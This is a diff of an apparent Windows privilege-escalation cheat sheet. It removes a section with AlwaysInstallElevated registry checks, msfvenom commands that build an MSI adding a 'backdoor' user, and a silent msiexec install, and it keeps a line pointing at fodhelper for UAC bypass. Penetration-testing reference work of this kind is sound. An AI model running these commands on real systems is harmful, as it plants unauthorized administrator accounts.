@@ -103,16 +103,6 @@ mountvol
 1. driverquery /v /FO Table  
 2. Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer
 ```
-
-##### Enumerating Binaries That AutoElevate
-```
-reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer  
-reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
-$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
-$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
-$ msiexec /quiet /qn /i C:\evil.msi
-```
-
 ##### Bypass UAC
 ```
 1. check C:\Windows\System32\fodhelper.exe
